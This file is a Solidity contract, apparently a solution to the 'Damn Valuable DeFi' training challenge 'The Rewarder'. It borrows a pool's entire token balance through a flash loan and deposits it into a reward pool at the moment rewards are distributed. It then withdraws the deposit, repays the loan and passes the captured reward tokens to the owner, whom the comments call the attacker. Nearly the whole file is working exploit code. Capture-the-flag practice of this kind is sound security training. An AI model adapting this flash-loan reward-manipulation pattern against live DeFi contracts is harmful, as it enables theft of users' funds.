// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "./RewardToken.sol";
import "./TheRewarderPool.sol";
import "./FlashLoanerPool.sol";
import "../DamnValuableToken.sol";

contract AttackOnRewarder {
    RewardToken rewardToken;
    DamnValuableToken damnValuableToken;
    FlashLoanerPool pool;
    TheRewarderPool rewarder;

    address private owner;

    constructor(
        address _damnValuableToken,
        address _rewardToken,
        address _pool,
        address _rewarder
    ) {
        damnValuableToken = DamnValuableToken(_damnValuableToken);
        rewardToken = RewardToken(_rewardToken);
        pool = FlashLoanerPool(_pool);
        rewarder = TheRewarderPool(_rewarder);
        owner = msg.sender;
    }

    function flashLoan() external {
        require(msg.sender == owner, "Only owner can call this");
        uint256 amount = damnValuableToken.balanceOf(address(pool));
        pool.flashLoan(amount);
    }

    function receiveFlashLoan(uint256 amount) external {
        require(
            msg.sender == address(pool),
            "Only pool can call this function"
        );
        // first approve rewarder pool to manage tokens from flashloan
        damnValuableToken.approve(address(rewarder), amount);
        // deposit loaned tokens into the rewarder
        // if time has passed, deposit function will distribute rewards
        rewarder.deposit(amount);
        // withdraw loaned tokens back
        rewarder.withdraw(amount);
        // transfer loaned tokens back to the loaner
        require(
            damnValuableToken.transfer(address(pool), amount),
            "Attack failed"
        );
        // withdraw reward to the owner, i.e. attacker
        uint256 reward = rewardToken.balanceOf(address(this));
        rewardToken.transfer(owner, reward);
    }
}
